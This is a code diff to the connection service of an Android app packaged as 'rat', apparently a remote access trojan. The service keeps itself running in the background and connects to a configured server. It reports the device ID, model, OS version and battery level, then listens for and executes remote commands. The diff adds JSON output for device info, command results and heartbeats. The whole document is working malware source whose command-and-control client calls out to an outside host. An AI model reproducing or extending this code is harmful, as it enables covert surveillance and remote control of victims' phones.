@@ -1,3 +1,4 @@
+
 package com.fly0rakoon.rat.services;
 
 import android.app.Service;
@@ -8,6 +9,9 @@ import android.util.Log;
 
 import com.fly0rakoon.rat.modules.*;
 import com.fly0rakoon.rat.utils.Constants;
+
+import org.json.JSONObject;
+import org.json.JSONException;
 
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
@@ -30,6 +34,7 @@ public class ConnectionManager extends Service {
     private Thread connectionThread;
     private boolean isRunning = false;
     private boolean isConnected = false;
+    private String deviceId;
     
     // Modules
     private CameraModule cameraModule;
@@ -50,6 +55,13 @@ public class ConnectionManager extends Service {
         super.onCreate();
         Log.d(TAG, "ConnectionManager service created");
         this.context = this;
+        
+        // Generate unique device ID
+        deviceId = android.provider.Settings.Secure.getString(
+            getContentResolver(), 
+            android.provider.Settings.Secure.ANDROID_ID
+        );
+        
         initializeModules();
         start();
     }
@@ -66,7 +78,7 @@ public class ConnectionManager extends Service {
         if (!isRunning) {
             start();
         }
-        return START_STICKY; // Keep service running
+        return START_STICKY;
     }
     
     @Override
@@ -78,7 +90,7 @@ public class ConnectionManager extends Service {
     
     @Override
     public IBinder onBind(Intent intent) {
-        return null; // Not a bound service
+        return null;
     }
 
     private void initializeModules() {
@@ -120,7 +132,6 @@ public class ConnectionManager extends Service {
                         Log.e(TAG, "Connection error: " + e.getMessage());
                     }
 
-                    // Wait before reconnecting
                     try {
                         Thread.sleep(Constants.RECONNECT_DELAY);
                     } catch (InterruptedException e) {
@@ -135,18 +146,15 @@ public class ConnectionManager extends Service {
 
     private void connectAndListen() {
         try {
-            // Close any existing connection
             closeConnection();
 
             Log.d(TAG, "Connecting to " + Constants.SERVER_IP + ":" + Constants.SERVER_PORT);
 
-            // Create socket and set timeouts
             socket = new Socket();
             socket.connect(new InetSocketAddress(Constants.SERVER_IP, Constants.SERVER_PORT),
                 Constants.CONNECTION_TIMEOUT);
             socket.setSoTimeout(Constants.SOCKET_TIMEOUT);
 
-            // Setup streams
             out = new PrintWriter(new BufferedWriter(
                 new OutputStreamWriter(socket.getOutputStream())), true);
             in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
@@ -154,10 +162,9 @@ public class ConnectionManager extends Service {
             isConnected = true;
             Log.d(TAG, "Connected to server");
 
-            // Send device info on connect
+            // Send device info on connect (NOW IN JSON FORMAT)
             sendDeviceInfo();
 
-            // Listen for commands
             String command;
             while (isRunning && isConnected && (command = in.readLine()) != null) {
                 Log.d(TAG, "Received command: " + command);
@@ -269,7 +276,8 @@ public class ConnectionManager extends Service {
                 response = "Unknown command. Type 'help' for available commands.";
         }
 
-        sendResponse(response);
+        // Send command responses as JSON
+        sendJsonResponse("response", cmd, response);
     }
     
     private String getHelp() {
@@ -307,9 +315,20 @@ public class ConnectionManager extends Service {
         info.append("  Battery: ").append(getBatteryInfo()).append("\n");
         return info.toString();
     }
-    
+
     private String getBatteryInfo() {
-        return "Battery level: 85% (placeholder)";
+        try {
+            android.content.IntentFilter ifilter = new android.content.IntentFilter(
+                android.content.Intent.ACTION_BATTERY_CHANGED
+            );
+            android.content.Intent batteryStatus = context.registerReceiver(null, ifilter);
+            int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
+            int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
+            int percentage = (int) ((level / (float) scale) * 100);
+            return "Battery level: " + percentage + "%";
+        } catch (Exception e) {
+            return "Battery level: Unknown";
+        }
     }
     
     private String getNetworkInfo() {
@@ -341,9 +360,47 @@ public class ConnectionManager extends Service {
         }
     }
     
+    // NEW: Send device info as JSON
     private void sendDeviceInfo() {
-        String info = "Device connected:\n" + getDeviceInfo();
-        sendResponse(info);
+        try {
+            JSONObject info = new JSONObject();
+            info.put("type", "device_info");
+            info.put("id", deviceId);
+            info.put("model", android.os.Build.MODEL);
+            info.put("manufacturer", android.os.Build.MANUFACTURER);
+            info.put("brand", android.os.Build.BRAND);
+            info.put("device", android.os.Build.DEVICE);
+            info.put("product", android.os.Build.PRODUCT);
+            info.put("android_version", android.os.Build.VERSION.RELEASE);
+            info.put("sdk", android.os.Build.VERSION.SDK_INT);
+            info.put("battery", getBatteryInfo());
+            info.put("timestamp", System.currentTimeMillis());
+            
+            sendResponse(info.toString());
+            Log.d(TAG, "Device info sent: " + info.toString());
+        } catch (JSONException e) {
+            Log.e(TAG, "Error creating device info JSON: " + e.getMessage());
+            // Fallback to old format
+            String info = "Device connected:\n" + getDeviceInfo();
+            sendResponse(info);
+        }
+    }
+    
+    // NEW: Send JSON response for commands
+    private void sendJsonResponse(String type, String command, String output) {
+        try {
+            JSONObject response = new JSONObject();
+            response.put("type", type);
+            response.put("deviceId", deviceId);
+            response.put("command", command);
+            response.put("output", output);
+            response.put("timestamp", System.currentTimeMillis());
+            
+            sendResponse(response.toString());
+        } catch (JSONException e) {
+            Log.e(TAG, "Error creating JSON response: " + e.getMessage());
+            sendResponse(output);
+        }
     }
     
     private void sendResponse(String response) {
@@ -355,7 +412,15 @@ public class ConnectionManager extends Service {
     
     public void sendHeartbeat() {
         if (isConnected) {
-            sendResponse("heartbeat");
+            try {
+                JSONObject heartbeat = new JSONObject();
+                heartbeat.put("type", "heartbeat");
+                heartbeat.put("deviceId", deviceId);
+                heartbeat.put("timestamp", System.currentTimeMillis());
+                sendResponse(heartbeat.toString());
+            } catch (JSONException e) {
+                sendResponse("heartbeat");
+            }
         }
     }
     
